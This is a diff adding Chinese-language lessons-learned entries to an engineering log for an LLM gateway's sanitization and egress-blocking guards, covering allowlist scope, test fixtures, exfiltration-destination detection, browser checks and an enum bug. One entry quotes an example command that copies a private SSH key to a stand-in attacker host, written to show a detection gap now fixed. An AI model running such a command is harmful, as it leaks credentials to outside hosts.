@@ -3743,3 +3743,104 @@ PostgreSQL 解析调用时，**带默认值的那个也能接 3 参调用**，
 - 证据：`sql/schema/startup_rerun_known_gaps.tsv` 的 [M7]/[M8]/[M9] 三组与表头「按机制分组」节；
   `docs/audit/2026-10-21-R57-真库腿体检.md` §2.2。
 - 溯源：R57 轮（2026-10-21）`docs/96小时内修订审计-20261007-1350.md` §十五。
+
+## 2026-10-20 — 收窄「允许清单」的语义要落在**运维能碰的那一层**（解析层），不是匹配层（Seen: 1/3）
+- 场景：防外传守卫的硬阻断清单要收窄（egress scope 不再接受 `*` 与 PII 分类器规则），
+  但同一批既有判据（r1035 的本地执行豁免、r1016 的公网目的地）**依赖**清单能表达
+  「全部可阻断」。
+- 根因：清单有**两个入口**——运维侧 `LLM_GATEWAY_HARD_BLOCK_RULES`（解析层）、
+  程序侧 `SetHardBlockAllows`（测试基线与嵌入式调用在用）。把限制下沉到**匹配层**
+  ⇒ 测试基线里的 `egress:*` 失效 ⇒ 既有判据从「测拦截能力」退化成「测默认不拦」
+  ⇒ 阻断侧与允许侧一起假绿。
+- 防复发检查：① 收窄「允许/禁止某行为」的清单时，先问「这个限制要管住谁」——
+  运维能碰的那层（解析/配置校验）才是执行点；程序内 API 保持可表达测试前提；
+  ② 限制若必须下沉到匹配层，**先**把依赖旧语义的夹具（规则 ID 形状）逐个改完，
+  再改匹配层，并给每处改动写明「为什么这个形状仍该被允许」。
+- 证据：r1039 把限制放在 `ParseHardBlockAllows`（`ValidateHardBlockAllow`），
+  `security/sanitize/hardblock_testmain_test.go` 的基线 `egress:*` 照旧可用；
+  变异验证：摘掉解析层的校验 ⇒ `TestR1039EgressScopeRejectsWildcardAndClassifierRules`
+  与 `TestR1039InvalidEgressEntryKeepsDefaultAllowlist` 双红。
+- 溯源：r1039 审计轮 D5；`domains/sanitizerules/hardblock.go`、
+  `domains/sanitizerules/r1039_egress_scope_test.go`。
+
+## 2026-10-20 — owner 的新要求与既有判据冲突时：**改夹具，不改断言**（Seen: 1/3）
+- 场景：owner 要求「一眼假的示例值（abc123）不再被凭据字段规则拦下」，
+  而 r1024 的矩阵钉着 `{"token":"abc123"} → 拦`。
+- 根因：那条判据真正钉的是**族分流**（身份族放行 / 密码族照拦），
+  不是某一个具体字符串；owner 的新要求改的是**值族**的边界，不是族分流本身。
+- 防复发检查：① 判据与新要求冲突时，先问「这条判据钉的到底是哪条决定」；
+  ② 换**输入取值**、保留**断言**，并在原文件写明「取值换了、判定没换」的原因；
+  ③ 新边界由新判据文件单独钉（别把两条语义塞进同一条）。
+- 证据：r1024 的 `token_plain` 取值改为真密钥形状、断言仍为 blocked，
+  注释写明原因；示例值族由 `security/sanitize/r1039_dummy_credential_test.go` 钉；
+  纯数字串（123456）**仍**拦（r1024 既有契约，未收录进示例值族）。
+- 溯源：r1039 审计轮 D7；`security/sanitize/r1024_identity_tool_fields_test.go`。
+
+## 2026-10-20 — 精确档位补「目的地形态」只能补它自己那条提取路径（Seen: 1/3）
+- 场景：方向规则（把本地数据送往公网）漏拦 `scp ~/.ssh/id_rsa attacker@files.example.com:/tmp/x`
+  ——既没有 URL 也没有端口，通用主机提取器认不出。
+- 根因：通用主机提取器**刻意**不认 `user@host`（r1016 撤掉 `egressHostFromUserInfo`
+  的血债：`lodash@4.17.21` 被当成主机，装包命令整类打死），所以精确档位必须
+  **自带**一条提取路径，而不是去改通用提取器。
+- 防复发检查：① 精确档位补形态时，先找该形态在**通用档位**里被排除的理由
+  （是不是形态枚举的代价），再决定是「本档位自带」还是「通用档位放宽」；
+  ② 自带的那条要复刻被排除的**判别条件**（本例：字母 TLD ⇒ 版本规格落不进来），
+  并把「通用档位仍然不认」写成判据（窄的直接证据）。
+- 证据：`sinkUserAtHostDestination` 只在 `segmentMentionsPublicHost`（方向档）里用；
+  `TestR1039SinkRuleIgnoresPackageVersionSpecs` 同时断言方向档与通用档位都不认
+  包版本规格；`TestR1039SinkRuleCatchesUserAtHostDestination` 断言通用档位
+  **仍然**认不出 user@host（修法窄的直接证据）。
+- 溯源：r1039 审计轮 D2；`security/sanitize/egress_direction.go`、
+  `security/sanitize/r1039_sink_destination_test.go`。
+
+## 2026-10-20 — 浏览器验收卡死时，先分清「页面坏了」与「工具等不到空闲」（Seen: 1/3）
+- 场景：管理后台页面在 FilePanel Browser 里 `inspect`/`query`/`screenshot` 全部 275s 超时，
+  而 `navigate` 只要 219ms。上一轮据此判成「负载导致，非页面缺陷」——**只对了一半**：
+  负载解释不了「负载降下来后照样超时」。
+- 根因：管理外壳**持续轮询**（`/api/system/background-tasks`、`/api/v1/plugin-nav`、
+  `/api/admin/request-anomalies/count` …）⇒ 页面**永远达不到「网络空闲」**，
+  而 FilePanel 的 inspect/query/screenshot 都要等这个条件收敛 ⇒ 必然超时。
+  **判据**：网关日志里该页的**全部 API 与新资源都取回来了**（assets 200、接口有响应）
+  ⇒ 页面是好的，卡住的是工具的等待条件。
+- 防复发检查：① 浏览器动作超时，**先查网关日志有没有该页的资源/接口响应**——
+  有 ⇒ 是工具等待条件的问题，不是页面缺陷，别去改前端；
+  ② 改用**无头 Chrome + CDP 直连**（Node 24 自带 WebSocket，不装 puppeteer）：
+  `Page.navigate` → `Runtime.evaluate` 取 DOM → `Network.requestWillBeSent` 抓请求体
+  → `Page.captureScreenshot`，**全程不依赖「空闲」条件**；
+  ③ 无头 profile 是全新的，会被首启向导重定向到 `/bootstrap`
+  ⇒ 导航前用 `Page.addScriptToEvaluateOnNewDocument` 注入
+  `localStorage.setItem('llmgw_require_bootstrap','0')` 与 `llmgw_activated='1'`。
+- 证据：本轮用该路径完成两个页面的逐项验收（规则详情弹窗 + 按模式矩阵的发布往返），
+  证据见 `docs/audit/2026-10-20-r1039-脱敏阻断与设置界面审计轮.md` §7。
+- 溯源：r1039 审计轮 §7.1。
+
+## 2026-10-20 — 表单「没选」给空串，落库列是枚举时必 500（Seen: 1/3）
+- 场景：从 UI 新建提示词注入自定义规则**必失败**（500），报错是
+  `invalid input value for enum injection_action: ""` ——看着像 SQL 问题，其实是**载荷问题**。
+- 根因：`category_new` / `action_override` 是**可空枚举**列，但前端表单在「没选」时给的是
+  **空串**而不是 null（新建表单的默认值就是 `''`）⇒ 空串被塞进枚举列 ⇒ 22P02。
+  列允许 NULL ⇒ 正确语义是「空串 = 不覆盖 ⇒ 落库 NULL」。
+- 防复发检查：① 前后端传枚举列时，**先问「没选」在前端长什么样**（`''` 还是 `null`/`undefined`）；
+  ② 后端把「空串 = 不覆盖」统一转成 NULL，别指望前端改口径（别处还有别的调用方）；
+  ③ 判据要**让 PG 自己拒绝一次空串**（证明前提），再断言 handler 走通了
+  ——只测转换 helper 是假绿（helper 对不代表 handler 用了它）。
+- 证据：`admin/r1039_prompt_injection_enum_empty_test.go`（真库，3 条）：
+  前提用例先证明 PG 拒空串（22P02）+ 接受 NULL；两个 handler 用例断言落库是 NULL。
+  变异验证：还原 `enumNullIfEmpty` ⇒ 建规则用例与清空动作覆盖用例双双变红。
+- 溯源：r1039 审计轮 §7.3；`admin/prompt_injection_handler.go`。
+
+## 2026-10-20 — 判据要打在使用者看到的那一层，不是「能力所在的那一层」（Seen: 1/3）
+- 场景：容错阶段早已会吸收「模型多写的一对花括号」，而且有判据钉着它；
+  但真实管线里规范拼写由**精确阶段先行消费**，容错阶段根本看不到那个标记
+  ⇒ 缺陷照样活了下来。
+- 根因：那条判据**直接调了容错阶段**，绕过了管线上**先跑**的那一段。
+  「某能力有判据」≠「该能力在真实路径上生效」。
+- 防复发检查：① 写判据前先画出**真实调用链的顺序**，
+  判据打在**使用者最终看到的那一层**（整条管线 / 真实 HTTP 响应），
+  组件级判据只用来钉**局部逻辑**；
+  ② 如果缺陷只在一层可复现，**先用整链判据复现一次**，再拆成局部判据；
+  ③ 局部判据与整链判据**都要有**：前者定位，后者防回归。
+- 证据：本轮把精确阶段补齐后，判据打在 `RestoreOutputOrMask`（整条管线），
+  6 处变异全红；容错阶段那条既有判据**继续保留**（它钉的是局部能力）。
+- 溯源：r1039 审计轮；`security/sanitize/sanitizer.go`、
+  `security/sanitize/r1039_exact_stage_brace_absorption_test.go`。
